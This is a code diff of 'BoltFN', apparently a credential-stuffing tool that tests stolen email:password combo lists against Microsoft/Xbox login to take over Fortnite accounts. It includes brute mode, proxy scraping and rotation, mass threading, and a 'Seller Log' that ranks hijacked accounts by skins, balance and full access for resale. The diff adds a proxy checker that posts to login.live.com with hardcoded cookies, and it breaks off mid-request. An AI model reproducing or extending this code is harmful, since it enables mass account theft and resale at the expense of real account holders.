@@ -77,17 +77,10 @@ class banchecker:
     bad = 0
 
 
-class counter:
-    mailaccessss = 0
-    bad = 0
-    cpm = 0
-    untilsleep = 0
-    goodlines = 0
-    badlines = 0
-
 
 class Counter:
     sellerstuff = []
+    proxy = False
     brute = False
     Checking = False
     remaining = []
@@ -115,6 +108,8 @@ class Counter:
     failedpercent = 0
     checkedpercent = 0
     guess = 0
+    goodlines = 0
+    badlines = 0
 
 
 class Main:
@@ -127,7 +122,7 @@ class Main:
         self.created = str(strftime('-[%m-%d-%Y %H-%M-%S]'))
         self.domain_list = self.lisr()
         disable_warnings()
-        self.version = '1.3'
+        self.version = '1.35'
         self.printing = Queue()
         self.caputer = Queue()
         self.start_time = 0
@@ -209,15 +204,16 @@ class Main:
         print(f'''
                                 {Fore.WHITE}[{Fore.GREEN}1{Fore.WHITE}] Fortnite via Xbox {Fore.WHITE}[{Fore.CYAN}Full Capture using Microsoft authentication{Fore.WHITE}]
                                 {Fore.WHITE}[{Fore.GREEN}2{Fore.WHITE}] Fortnite via Xbox {Fore.WHITE}[{Fore.CYAN}Brute Mode{Fore.WHITE}]
-                                {Fore.WHITE}[{Fore.GREEN}3{Fore.WHITE}] Proxy Scraper     {Fore.WHITE}[{Fore.CYAN}Scrape proxies for checking{Fore.WHITE}]
-                                {Fore.WHITE}[{Fore.GREEN}4{Fore.WHITE}] Combo Editor      {Fore.WHITE}[{Fore.CYAN}Maximise your combos{Fore.WHITE}]
-                                {Fore.WHITE}[{Fore.GREEN}5{Fore.WHITE}] Url Scraper       {Fore.WHITE}[{Fore.CYAN}Scrape proxies from a url file{Fore.WHITE}]
-                                {Fore.WHITE}[{Fore.GREEN}6{Fore.WHITE}] Exit
+                                {Fore.WHITE}[{Fore.GREEN}3{Fore.WHITE}] Proxy Checker     {Fore.WHITE}[{Fore.CYAN}Check if your proxies work for Microsoft{Fore.WHITE}]
+                                {Fore.WHITE}[{Fore.GREEN}4{Fore.WHITE}] Proxy Scraper     {Fore.WHITE}[{Fore.CYAN}Scrape proxies for checking{Fore.WHITE}]
+                                {Fore.WHITE}[{Fore.GREEN}5{Fore.WHITE}] Combo Editor      {Fore.WHITE}[{Fore.CYAN}Maximise your combos{Fore.WHITE}]
+                                {Fore.WHITE}[{Fore.GREEN}6{Fore.WHITE}] Url Scraper       {Fore.WHITE}[{Fore.CYAN}Scrape proxies from a url file{Fore.WHITE}]
+                                {Fore.WHITE}[{Fore.GREEN}7{Fore.WHITE}] Exit
 ''')
         mode = input(f'{Fore.YELLOW}                > ')
 
 
-        if mode == "4":
+        if mode == "5":
             system('cls')
             print(self.t)
             windll.kernel32.SetConsoleTitleW(
@@ -278,7 +274,7 @@ class Main:
                         f"{Fore.CYAN}\nPlease enter a valid number\n{Fore.YELLOW}")
                     sleep(1)
                     continue
-        elif mode == "5":
+        elif mode == "6":
             system('cls')
             print(self.t)
             if not path.exists('Scraped.txt'):
@@ -332,7 +328,7 @@ class Main:
             system('cls')
             Main()
 
-        elif mode == "3":
+        elif mode == "4":
             system('cls')
             print(self.t)
             urls = [
@@ -405,7 +401,12 @@ class Main:
             input('Press ENTER to get back to the menu')
             system('cls')
             Main()
-        elif mode == "6":
+        elif mode == "3":
+            system('cls')
+            print(self.t)
+            print("")
+            Counter.proxy = True
+        elif mode == "7":
             exit()
         elif mode == "1" or mode == "2":
             if mode == "2":
@@ -417,141 +418,142 @@ class Main:
             print("Wrong number!")
             system('cls')
             Main()
-        checkname = input(f'{Fore.LIGHTCYAN_EX}Name for the check: ')
-        while True:
-            try:
-                if Checker.mode.lower() in ('bolt', 'cn', 'nexus'):
-                    self.cuimode = 'y'
-                    break
-                elif 'log' == Checker.mode.lower():
-                    self.cuimode = 'n'
-                    print(Fore.YELLOW)
-                    print_slowly('Using Log Mode', 0.05)
-                    break
-                else:
-                    Checker.mode = input(f'{Fore.LIGHTCYAN_EX}Display mode? cui/log: ')
-            except:
-                print(f'{Fore.RED}Invalid input')
-        if self.cuimode == 'y':
+        if not Counter.proxy:
+            checkname = input(f'{Fore.LIGHTCYAN_EX}Name for the check: ')
             while True:
                 try:
-                    if Checker.mode.lower() == 'bolt':
-                        self.cuitype = 'bolt'
-                        print(Fore.MAGENTA)
-                        print_slowly('Using BoltFN CUI', 0.05)
+                    if Checker.mode.lower() in ('bolt', 'cn', 'nexus'):
+                        self.cuimode = 'y'
                         break
-                    elif Checker.mode.lower() == 'cn':
-                        self.cuitype = 'cn'
-                        print(Fore.GREEN)
-                        print_slowly('Using CnChecker CUI', 0.05)
-                        break
-                    elif Checker.mode.lower() == 'nexus':
-                        self.cuitype = 'nexus'
-                        print(Fore.RED)
-                        print_slowly('Using Nexus CUI', 0.05)
+                    elif 'log' == Checker.mode.lower():
+                        self.cuimode = 'n'
+                        print(Fore.YELLOW)
+                        print_slowly('Using Log Mode', 0.05)
                         break
                     else:
-                        Checker.mode = input(f'{Fore.LIGHTCYAN_EX}CUI mode? bolt/cn/nexus: ')
+                        Checker.mode = input(f'{Fore.LIGHTCYAN_EX}Display mode? cui/log: ')
                 except:
                     print(f'{Fore.RED}Invalid input')
+            if self.cuimode == 'y':
+                while True:
+                    try:
+                        if Checker.mode.lower() == 'bolt':
+                            self.cuitype = 'bolt'
+                            print(Fore.MAGENTA)
+                            print_slowly('Using BoltFN CUI', 0.05)
+                            break
+                        elif Checker.mode.lower() == 'cn':
+                            self.cuitype = 'cn'
+                            print(Fore.GREEN)
+                            print_slowly('Using CnChecker CUI', 0.05)
+                            break
+                        elif Checker.mode.lower() == 'nexus':
+                            self.cuitype = 'nexus'
+                            print(Fore.RED)
+                            print_slowly('Using Nexus CUI', 0.05)
+                            break
+                        else:
+                            Checker.mode = input(f'{Fore.LIGHTCYAN_EX}CUI mode? bolt/cn/nexus: ')
+                    except:
+                        print(f'{Fore.RED}Invalid input')
 
-        system('cls')
-        print(self.t)
-        print("")
-        print(f'{Fore.LIGHTCYAN_EX}Here is your current config:\n')
-        print(f'{Fore.CYAN}-- Proxy: {Checker.Proxy.proxy}')
-        if Checker.Proxy.proxy == True:
-            print(f'{Fore.CYAN}-- Proxy Type: {Checker.Proxy.type}')
-        print(f'{Fore.CYAN}-- Threads: {Checker.threads}')
-        print(f'{Fore.CYAN}-- Timeout: {Checker.timeout}')
-        print(
-            f'{Fore.LIGHTCYAN_EX}Are you happy with this config? (y to start checking n to edit)')
-        edit = input('> ')
-        if 'n' in edit:
             system('cls')
             print(self.t)
-            print(f'{Fore.CYAN}[Config] Ok lets edit your config then\n')
+            print("")
+            print(f'{Fore.LIGHTCYAN_EX}Here is your current config:\n')
+            print(f'{Fore.CYAN}-- Proxy: {Checker.Proxy.proxy}')
+            if Checker.Proxy.proxy == True:
+                print(f'{Fore.CYAN}-- Proxy Type: {Checker.Proxy.type}')
+            print(f'{Fore.CYAN}-- Threads: {Checker.threads}')
+            print(f'{Fore.CYAN}-- Timeout: {Checker.timeout}')
             print(
-                f'{Fore.CYAN}[Config] Would you like to use proxies for checking? y/n')
-            lol = input('> ')
-            if 'y' == lol:
-                Checker.Proxy.proxy = True
-            else:
-                Checker.Proxy.proxy = False
-            print(f'{Fore.CYAN}[Config] Proxy set to {Checker.Proxy.proxy}')
-            if Checker.Proxy.proxy:
+                f'{Fore.LIGHTCYAN_EX}Are you happy with this config? (y to start checking n to edit)')
+            edit = input('> ')
+            if 'n' in edit:
+                system('cls')
+                print(self.t)
+                print(f'{Fore.CYAN}[Config] Ok lets edit your config then\n')
                 print(
-                    f'{Fore.CYAN}[Config] What type of proxy are you using? socks4|socks5|http')
-                self.proxy_type = str(input('> '))
-                print(
-                    f'{Fore.CYAN}[Config] Proxy Type set to {self.proxy_type}')
-            print(
-                f'{Fore.CYAN}[Config] How many threads would you like to use? (max 1000)')
-            while True:
-                try:
-                    Checker.threads = int(input('> '))
-                    break
-                except:
-                    print(f'{Fore.CYAN}[Config] Please Enter a number')
-                    sleep(0.5)
-            print(f'{Fore.CYAN}[Config] Threads set to {Checker.threads}')
-            print(
-                f'{Fore.CYAN}[Config] What would you like your request timeout to be? (in seconds)')
-            Checker.timeout = int(input('> '))
-            print(
-                f'{Fore.CYAN}[Config] Request timeout set to {Checker.timeout}')
-            print(f'{Fore.CYAN}[Config] How many retries would you like?')
-            Checker.retries = int(input('> '))
-            print(f'{Fore.CYAN}[Config] Retries set to {Checker.retries}')
-            config['checker']['proxy']['proxy'] = Checker.Proxy.proxy
-            config['checker']['threads'] = Checker.threads
-            config['checker']['timeout'] = Checker.timeout * 1000 
-            config['checker']['retries'] = Checker.retries
-            config['checker']['proxy']['proxy_type'] = self.proxy_type
-            with open('config/config.yml', 'w') as file:
-                dump(config, file)
-            print(f'{Fore.GREEN}[Config] Updated values')
-            sleep(1)
-            system('cls')
-        print(f'{Fore.CYAN}Importing combos.....\n')
-        self.combolist = []
-        while True:
-            if not Checker.importFromFile:
-                read_files = glob('combos/*.txt')
-                if read_files == '[]':
-                    print(
-                        f'{Fore.YELLOW}No Combos files found in directory please put your combos in there and try again')
-                    input(f'{Fore.CYAN}Press ENTER when you have done that')
-                    continue
-                for file in read_files:
-                    combolistt = open(file, 'r', encoding='u8',
-                                    errors='ignore').read().split('\n')
-                    for line in combolistt:
-                        self.combolist.append(f'{line}')
-                break
-            else:
-                filename = filedialog.askopenfile(mode='rb', title='Choose a Combo file',filetype=(("txt", "*.txt"), ("All files", "*.txt")))
-                if filename is None:
-                    print(Fore.LIGHTRED_EX+"Invalid File.")
-                    sleep(1)
-                    continue
+                    f'{Fore.CYAN}[Config] Would you like to use proxies for checking? y/n')
+                lol = input('> ')
+                if 'y' == lol:
+                    Checker.Proxy.proxy = True
                 else:
+                    Checker.Proxy.proxy = False
+                print(f'{Fore.CYAN}[Config] Proxy set to {Checker.Proxy.proxy}')
+                if Checker.Proxy.proxy:
+                    print(
+                        f'{Fore.CYAN}[Config] What type of proxy are you using? socks4|socks5|http')
+                    self.proxy_type = str(input('> '))
+                    print(
+                        f'{Fore.CYAN}[Config] Proxy Type set to {self.proxy_type}')
+                print(
+                    f'{Fore.CYAN}[Config] How many threads would you like to use? (max 1000)')
+                while True:
                     try:
-                        with open(filename.name, 'r', encoding='u8') as e:
-                            for line in e:
-                                self.combolist.append(f'{line}')
-                            break
-                    except Exception as e:
-                        print(Fore.LIGHTRED_EX+"Unable to read from file")
+                        Checker.threads = int(input('> '))
+                        break
+                    except:
+                        print(f'{Fore.CYAN}[Config] Please Enter a number')
+                        sleep(0.5)
+                print(f'{Fore.CYAN}[Config] Threads set to {Checker.threads}')
+                print(
+                    f'{Fore.CYAN}[Config] What would you like your request timeout to be? (in seconds)')
+                Checker.timeout = int(input('> '))
+                print(
+                    f'{Fore.CYAN}[Config] Request timeout set to {Checker.timeout}')
+                print(f'{Fore.CYAN}[Config] How many retries would you like?')
+                Checker.retries = int(input('> '))
+                print(f'{Fore.CYAN}[Config] Retries set to {Checker.retries}')
+                config['checker']['proxy']['proxy'] = Checker.Proxy.proxy
+                config['checker']['threads'] = Checker.threads
+                config['checker']['timeout'] = Checker.timeout * 1000 
+                config['checker']['retries'] = Checker.retries
+                config['checker']['proxy']['proxy_type'] = self.proxy_type
+                with open('config/config.yml', 'w') as file:
+                    dump(config, file)
+                print(f'{Fore.GREEN}[Config] Updated values')
+                sleep(1)
+                system('cls')
+            print(f'{Fore.CYAN}Importing combos.....\n')
+            self.combolist = []
+            while True:
+                if not Checker.importFromFile:
+                    read_files = glob('combos/*.txt')
+                    if read_files == '[]':
+                        print(
+                            f'{Fore.YELLOW}No Combos files found in directory please put your combos in there and try again')
+                        input(f'{Fore.CYAN}Press ENTER when you have done that')
+                        continue
+                    for file in read_files:
+                        combolistt = open(file, 'r', encoding='u8',
+                                        errors='ignore').read().split('\n')
+                        for line in combolistt:
+                            self.combolist.append(f'{line}')
+                    break
+                else:
+                    filename = filedialog.askopenfile(mode='rb', title='Choose a Combo file',filetype=(("txt", "*.txt"), ("All files", "*.txt")))
+                    if filename is None:
+                        print(Fore.LIGHTRED_EX+"Invalid File.")
                         sleep(1)
                         continue
-        withoutremoved = len(self.combolist)
-        self.accounts = set([x for x in self.combolist if x != '' and ':' in x])
-        removed = withoutremoved - len(self.accounts)
-        print(
-        f'{Fore.GREEN}Imported {len(self.accounts)} Combo lines after removing {removed} duplicates\n')
+                    else:
+                        try:
+                            with open(filename.name, 'r', encoding='u8') as e:
+                                for line in e:
+                                    self.combolist.append(f'{line}')
+                                break
+                        except Exception as e:
+                            print(Fore.LIGHTRED_EX+"Unable to read from file")
+                            sleep(1)
+                            continue
+            withoutremoved = len(self.combolist)
+            self.accounts = set([x for x in self.combolist if x != '' and ':' in x])
+            removed = withoutremoved - len(self.accounts)
+            print(
+            f'{Fore.GREEN}Imported {len(self.accounts)} Combo lines after removing {removed} duplicates\n')
         self.proxylist = []
-        if Checker.Proxy.proxy == True:
+        if Checker.Proxy.proxy or Counter.proxy:
             print(f'{Fore.CYAN}Importing proxies.....\n')
             while True:
                 if not self.proxyapi:
@@ -584,104 +586,204 @@ class Main:
                                 print(Fore.LIGHTRED_EX+"Unable to read from file")
                                 sleep(1)
                                 continue
-        if Checker.Proxy.proxy == True:
+        if Checker.Proxy.proxy or Counter.proxy:
             if not self.proxyapi:
                 withoutremoved = len(self.proxylist)
                 self.proxylist = list(
                     set([x.strip() for x in self.proxylist if ":" in x and x != '']))
                 removed = withoutremoved - len(self.proxylist)
-                print(
-                    f'{Fore.GREEN}Imported {len(self.proxylist)} Proxy lines after removing {removed} duplicates')
+                print(f'{Fore.GREEN}Imported {len(self.proxylist)} Proxy lines after removing {removed} duplicates')
             else:
-                print(f'{Fore.CYAN}Importing proxies from api...\n')
-                self.proxylist = requests.get(
-                    Checker.Proxy.proxy_api_link).text.split('\n')
-                print(f'{Fore.GREEN}Imported {len(self.proxylist)} Proxy lines\n')
+                if not Counter.proxy:
+                    print(f'{Fore.CYAN}Importing proxies from api...\n')
+                    self.proxylist = requests.get(
+                        Checker.Proxy.proxy_api_link).text.split('\n')
+                    print(f'{Fore.GREEN}Imported {len(self.proxylist)} Proxy lines\n')
         print(f'{Fore.LIGHTCYAN_EX}[BoltFN] Starting Threads...\n')
         windll.kernel32.SetConsoleTitleW(
             f'BoltFN | v{self.version} | Getting ready!')
         unix = str(strftime('%d-%m-%Y %H-%M-%S'))
         if not path.exists('Results'):
             mkdir('Results')
-        self.folder = f'Results/Normal Mode-({checkname}){unix}'
+        if Counter.proxy:
+            self.folder = f'Results/Proxy Checker-{unix}'
+        elif Counter.brute:
+            self.folder = f'Results/Brute Mode-({checkname}){unix}'
+        else:
+            self.folder = f'Results/Normal Mode-({checkname}){unix}'
         if not path.exists(self.folder):
             mkdir(self.folder)
-        Thread(target=self.cpm_counter, daemon=False).start()
-        self.start_time = time()
+        if Counter.proxy:
+            Thread(target=self.proxy_cpm, daemon=False).start()
+        else:
+            Thread(target=self.cpm_counter, daemon=False).start()
         Thread(target=self.title, daemon=False).start()
+        self.start_time = time()
         print(f'{Fore.GREEN}[BoltFN] Done!\n')
         sleep(3)
         system('cls')
         print(self.t)
-        if 'y' == self.cuimode:
-            print(f'{Fore.LIGHTCYAN_EX}Checking: CUI Mode')
-        else:
-            print(f'{Fore.LIGHTCYAN_EX}Checking: LOG Mode')
-        print(f'{Fore.CYAN}-- Proxy: {Checker.Proxy.proxy}')
-        if Checker.Proxy.proxy:
-            print(f'{Fore.CYAN}-- Proxy Type: {Checker.Proxy.type}')
-        print(f'{Fore.CYAN}-- Threads: {Checker.threads}')
-        print(f'{Fore.CYAN}-- Timeout: {Checker.timeout}')
-        print(f'{Fore.CYAN}-- Retries: {Checker.retries}\n')
-        try:
-            print(f'{Fore.CYAN}- Combo Lines: {len(self.combolist)}')
-            print(f'{Fore.CYAN}- Proxy Lines: {len(self.proxylist)}\n')
-        except:
-            self.proxylist = []
-            print('\n')
-        Counter.Checking = True
-        if 'y' == self.cuimode:
-            Thread(target=self.Refreshconsole, daemon=False).start()
-        Counter.remaining = list(self.accounts)
-        with concurrent.futures.ThreadPoolExecutor(max_workers=Checker.threads) as executor:
-            futures = [executor.submit(self.usecheck, combo) for combo in self.accounts]
-            concurrent.futures.wait(futures)
-        categorized_data = {
-            "Exclusives": [],
-            "300+ Skins": [],
-            "200-299 Skins": [],
-            "100-199 Skins": [],
-            "50-99 Skins": [],
-            "10-49 Skins": [],
-            "1-9 Skins": [],
-            "0 Skins": []
-        }
-
-        for entry in Counter.sellerstuff:
-            if entry["exclusive"] == "Yes":
-                categorized_data["Exclusives"].append(entry)
-            elif entry["total_skins"] >= 300:
-                categorized_data["300+ Skins"].append(entry)
-            elif 200 <= entry["total_skins"] <= 299:
-                categorized_data["200-299 Skins"].append(entry)
-            elif 100 <= entry["total_skins"] <= 199:
-                categorized_data["100-199 Skins"].append(entry)
-            elif 50 <= entry["total_skins"] <= 99:
-                categorized_data["50-99 Skins"].append(entry)
-            elif 10 <= entry["total_skins"] <= 49:
-                categorized_data["10-49 Skins"].append(entry)
-            elif 1 <= entry["total_skins"] <= 9:
-                categorized_data["1-9 Skins"].append(entry)
+        if not Counter.proxy:
+            if 'y' == self.cuimode:
+                print(f'{Fore.LIGHTCYAN_EX}Checking: CUI Mode')
             else:
-                categorized_data["0 Skins"].append(entry)
-
-        with open(f'{self.folder}/Seller Log.txt', 'w') as file:
-            for category, entries in categorized_data.items():
-                if entries:
-                    file.write(f"========== {category} =========\n")
-                    for entry in entries:
-                        file.write(f"FullAccess: {entry['fullAccess']} | VerifiedEmail: {entry['mail_verified']} | TwoFactor: {entry['2fa']} | Total Skins: {entry['total_skins']}\n")
-                        file.write(f"Skins: {', '.join(entry['skins_list'])}\n")
-                        if entry["exclusive"] == "Yes":
-                            file.write(f"Exclusives: {', '.join(entry['exclusives_list'])}\n")
-                        file.write("="*30 + "\n")
-        system('cls')
-        print(self.t)
-        print(f'{Fore.CYAN}Done checking')
-        print(f'Seller Log created, you may close the checker')
+                print(f'{Fore.LIGHTCYAN_EX}Checking: LOG Mode')
+            print(f'{Fore.CYAN}-- Proxy: {Checker.Proxy.proxy}')
+            if Checker.Proxy.proxy:
+                print(f'{Fore.CYAN}-- Proxy Type: {Checker.Proxy.type}')
+            print(f'{Fore.CYAN}-- Threads: {Checker.threads}')
+            print(f'{Fore.CYAN}-- Timeout: {Checker.timeout}')
+            print(f'{Fore.CYAN}-- Retries: {Checker.retries}\n')
+            try:
+                print(f'{Fore.CYAN}- Combo Lines: {len(self.combolist)}')
+                print(f'{Fore.CYAN}- Proxy Lines: {len(self.proxylist)}\n')
+            except:
+                self.proxylist = []
+                print('\n')
+        else:
+            print(f'{Fore.LIGHTCYAN_EX}Checking: Proxy Checker\n')
+            print(f'{Fore.CYAN}- Proxy Lines: {len(self.proxylist)}\n')
+        if not Counter.proxy:
+            Counter.Checking = True
+        if not Counter.proxy:
+            if 'y' == self.cuimode:
+                Thread(target=self.Refreshconsole, daemon=False).start()
+            Counter.remaining = list(self.accounts)
+            with concurrent.futures.ThreadPoolExecutor(max_workers=Checker.threads) as executor:
+                futures = [executor.submit(self.usecheck, combo) for combo in self.accounts]
+                concurrent.futures.wait(futures)
+        else:
+            with concurrent.futures.ThreadPoolExecutor(max_workers=Checker.threads) as executor:
+                futures = [executor.submit(self.proxycheck, proxy) for proxy in self.proxylist]
+                concurrent.futures.wait(futures)
         Counter.Checking = False
-                    
+        if not Counter.proxy:
+            categorized_data = {
+                "Exclusives": [],
+                "300+ Skins": [],
+                "200-299 Skins": [],
+                "100-199 Skins": [],
+                "50-99 Skins": [],
+                "10-49 Skins": [],
+                "1-9 Skins": [],
+                "0 Skins": []
+            }
 
+            for entry in Counter.sellerstuff:
+                if entry['exclusive']:
+                    categorized_data["Exclusives"].append(entry)
+                elif entry["total_skins"] >= 300:
+                    categorized_data["300+ Skins"].append(entry)
+                elif 200 <= entry["total_skins"] <= 299:
+                    categorized_data["200-299 Skins"].append(entry)
+                elif 100 <= entry["total_skins"] <= 199:
+                    categorized_data["100-199 Skins"].append(entry)
+                elif 50 <= entry["total_skins"] <= 99:
+                    categorized_data["50-99 Skins"].append(entry)
+                elif 10 <= entry["total_skins"] <= 49:
+                    categorized_data["10-49 Skins"].append(entry)
+                elif 1 <= entry["total_skins"] <= 9:
+                    categorized_data["1-9 Skins"].append(entry)
+                else:
+                    categorized_data["0 Skins"].append(entry)
+
+            with open(f'{self.folder}/Seller Log.txt', 'w') as file:
+                for category, entries in categorized_data.items():
+                    if entries:
+                        file.write(f"========== {category} ==========\n")
+                        for entry in entries:
+                            if entry['fullAccess'] == 'FA':
+                                fa = 'True'
+                            else:
+                                fa = 'False'
+                            file.write(f'FullAccess: {fa} | VerifiedEmail: {entry['mail_verified']} | TwoFactor: {entry['2fa']} | LinkedAccounts: {entry['linked_accs']} | Balance: {entry['balance']} | LastMatch: {entry['last_login']}\n')
+                            if category !='0 Skins':
+                                file.write(f"Skins: [{entry['total_skins']}] {', '.join(entry['skins_list'])}\n")
+                            if entry['exclusive']:
+                                file.write(f'Exclusives: [{len(entry['exclusives_list'])}] {', '.join(entry['exclusives_list'])}\n')
+                            file.write("="*30 + "\n")
+            sleep(5)
+            system('cls')
+            print(self.t)
+            print(f'{Fore.CYAN}Done checking\n')
+            print(f'{Fore.GREEN}Seller Log created, you may close the checker')
+        else:
+            print(f'{Fore.CYAN}Done checking\n')
+                    
+    def proxycheck(self,proxy):
+        proxy = choice(self.proxylist)
+        if self.proxy_type.lower() == 'http' or self.proxy_type.lower() == 'https':
+            proxy_form = {'http': 'http://'+proxy, 'https': 'http://'+proxy}
+        else:
+            proxy_form = {
+                'http': f"{self.proxy_type.lower()}://{proxy}",
+                'https': f"{self.proxy_type.lower()}://{proxy}"
+            }
+        headers = {
+            "Accept-Encoding": "gzip, deflate, br",
+            "Accept-Language": "en,en-US;q=0.9,en;q=0.8",
+            "Cache-Control": "max-age=0",
+            "Connection": "keep-alive",
+            "Content-Length": "814",
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Cookie": "MicrosoftApplicationsTelemetryDeviceId=920e613f-effa-4c29-8f33-9b639c3b321b; MSFPC=GUID=1760ade1dcf744b88cec3dccf0c07f0d&HASH=1760&LV=202311&V=4&LU=1701108908489; mkt=ar-SA; IgnoreCAW=1; MUID=251A1E31369E6D281AED0DE737986C36; MSCC=197.33.70.230-EG; MSPBack=0; NAP=V=1.9&E=1cca&C=sD-vxVi5jYeyeMkwVA7dKII2IAq8pRAa4DmVKHoqD1M-tyafuCSd4w&W=2; ANON=A=D086BC080C843D7172138ECBFFFFFFFF&E=1d24&W=2; SDIDC=CVbyEkUg8GuRPdWN!EPGwsoa25DdTij5DNeTOr4FqnHvLfbt1MrJg5xnnJzsh!HecLu5ZypjM!sZ5TtKN5sdEd2rZ9rugezwzlcUIDU5Szgq7yMLIVdfna8dg3sFCj!kQaXy2pwx6TFwJ7ar63EdVIz*Z3I3yVzEpbDMlVRweAFmG1M54fOyH0tdFaXs5Mk*7WyS05cUa*oiyMjqGmeFcnE7wutZ2INRl6ESPNMi8l98WUFK3*IKKZgUCfuaNm8lWfbBzoWBy9F3hgwe9*QM1yi41O*rE0U0!V4SpmrIPRSGT5yKcYSEDu7TJOO1XXctcPAq21yk*MnNVrYYfibqZvnzRMvTwoNBPBKzrM6*EKQd6RKQyJrKVdEAnErMFjh*JKgS35YauzHTacSRH6ocroAYtB0eXehx5rdp2UyG5kTnd8UqA00JYvp4r1lKkX4Tv9yUb3tZ5vR7JTQLhoQpSblC4zSaT9R5AgxKW3coeXxqkz0Lbpz!7l9qEjO*SdOm*5LBfF2NZSLeXlhol**kM3DFdLVyFogVq0gl0wR52Y02; MSPPre=imrozza%40outlook.com%7c8297dd0d702a14b0%7c%7c; MSPCID=8297dd0d702a14b0; MSPSoftVis=@:@; MSPRequ=id=N&lt=1701944501&co=0; uaid=a7afddfca5ea44a8a2ee1bba76040b3c; OParams=11O.DmVQflQtPeQAtoyExD*hjGXsJOLcnQHVlRoIaEDQfzrgMX2Lpzfa992qCQeIn0O8kdrgRfMm1kEmcXgJqSTERtHj0vlp9lkdMHHCEwZiLEOtxzmks55h!6RupAnHQKeVfVEKbzcTLMei4RMeW1drXQ0BepPQN*WgCK3ua!f6htixcJYNtwumc8f29KYtizlqh0lqQ3a2dZ4Kd!KDOneLTE512ScqObfQd5AGBu*xLbcRbg6xqh1eWCOXW!JOT6defiMqxBGPNL1kQUYgc5WAG8tmjMPFLqVn1*f4xws1NDhwmYOHPu!rS9dn*trC71knxMAfi5Tt69XZHdojgnuopBag*YM7uIBrhUyfxjR*4Zkyygfax9gMaxxG9KScOnPvemNY1ZfVH9Vm!IxQFKoPoKBdLVH5Jc7Eokycow31oq7vNcAbi!cS3Wby0LjzBdr8jq2Aqj3RlWfckJaRoReZ4nY34Gh*eVllAMrF*VQP1iQ7t*I28266q6OQGZ9Y1q53Ai72b!8H5wjQJIJw1XV4zwRO8J02gt6vIPpLBFiq!7IkawEubBPpynkQ3neDo92Tpc71Y*WrnD6H8ojgzxRAj!DIiyfyA7kJHJ7DU!XSg*Xo0L1!DRYSBV!PKwNM7MaBiqsKbRWFnFyzKhBACfiPe8dK5ZUGBSpFbUlpXkUJOb247ewTWAsl9D4G6mezVjGY1u9uOYUPc3ZqTEBFRf4TK94CllbiMRC0v26W*qlwOl0SSpBufo8MtOUqvowUFqEWDDVl9WFV5bT2zZVUy4kPj9a*3YNnskgZghnOCtQYKIIRdFTWgL*DcbQ4XRL8hMisBDjyniS16W2P!1FH0dT12w7RlsJCdotQSK1WppX8sGWNrPrYNcih5ErXVZtYKbqrZLw2EcyGmkp7NxBHFUQXx*1tZSEeiWoZ5BrHSiEB7X2gB7BQDP7RbVYZS5UXeNp3rlGdN*5!nUGK3Fltm1sKFmtZU!T1Q0WaeFwVvpFYSCxg9uw6CC!va2dB*R6NFK!3GNBDrCvbXnJMaKVb!UoBP5G*GASdPnuJgb3cjUE*DIYMJRrPT!dZoHd5BAQSF3vBoPZasphWeflxXFMPBi055OBEawIzxOqS6Wn3IZCp3dgk8QLNssATkzwZvpUM5lSq710QTMZWENDKp5gTIlWcdYpKG1d8TmRlqXRJN7bdUuRIoehIWqnfSuJxGoNk6PM3x3!gMaxPxe1Ch6hMmsagHM8fFQ!MpP0TQ9nsIxh1goCaL*PbHDyj1U3btyu2RXibwIwgV1h5A6DgwmgbaH1Hn9LpdLipiT5fGiRbI903!wYUA3MgQg98OH9BQaJPXte1YpL8iUjUA9MreaZTQ5P13cUiNYrkTW2jVr5PTpEJvwpg*8piWEo9k*IzOCr6iKMRiZwTft*QYEEaKxbyvgLG*s33uhCN46R9J1VwPufzsxyGUHYyE5S1mhx8sWxw!pndIQ!RgVEsDfzvOO0H2P1hBGQG8npJ18th2WKYrvouqHZfRBcEc77hsbXUKec2lv4ETHag0RdrT6kFn03RDX*p*Hac*nugVJK1j0GouxkITbOmMjb8cpau*Lf*xNBUFc3roCuPjEpAcR48X51rIGpOjhAe56Q6CbwIuVe*z*KmRptzngkT4!AB*FGGKh2lOi6b0qR1w4Aia2g1pfjJU2G1r*Q!kSNxYtGn0WOkHiVkhAXQCvkNFp3q!ivZs3obM!0ffg$$; ai_session=6FvJma4ss/5jbM3ZARR4JM|1701943445431|1701944504493; MSPOK=$uuid-d9559e5d-eb3c-4862-aefb-702fdaaf8c62$uuid-d48f3872-ff6f-457e-acde-969d16a38c95$uuid-c227e203-c0b0-411f-9e65-01165bcbc281$uuid-98f882b7-0037-4de4-8f58-c8db795010f1$uuid-0454a175-8868-4a70-9822-8e509836a4ef$uuid-ce4db8a3-c655-4677-a457-c0b7ff81a02f$uuid-160e65e0-7703-4950-9154-67fd0829b36",
+            "Host": "login.live.com",
+            "Origin": "https://login.live.com",
+            "Referer": "https://login.live.com/oauth20_authorize.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&redirect_uri=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized&state=eyJpZCI6IjAzZDZhYmM1NDIzMjQ2Yjg5MWNhYmM2ODg0ZGNmMGMzIn0%3D&scope=xboxlive.signin&service_entity=undefined&force_verify=true&response_type=code&display=popup",
+            "Sec-Fetch-Dest": "document",
+            "Sec-Fetch-Mode": "navigate",
+            "Sec-Fetch-Site": "same-origin",
+            "Sec-Fetch-User": "?1",
+            "Upgrade-Insecure-Requests": "1",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
+            "sec-ch-ua": "\"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"109\", \"Chromium\";v=\"109\"",
+            "sec-ch-ua-mobile": "?0",
+            "sec-ch-ua-platform": "\"Windows\""
+        }
+        url = 'https://login.live.com/ppsecure/post.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&contextid=A31E247040285505&opid=F7304AA192830107&bk=1701944501&uaid=a7afddfca5ea44a8a2ee1bba76040b3c&pid=15216'
+        payload = {
+            "i13": "0",
+            "login": 'proxychecker@proxy.me',
+            "loginfmt": 'proxychecker@proxy.me',
+            "type": "11",
+            "LoginOptions": "3",
+            "lrt": "",
+            "lrtPartition": "",
+            "hisRegion": "",
+            "hisScaleUnit": "",
+            "passwd": 'test123!T',
+            "ps": "2",
+            "psRNGCDefaultType": "1",
+            "psRNGCEntropy": "",
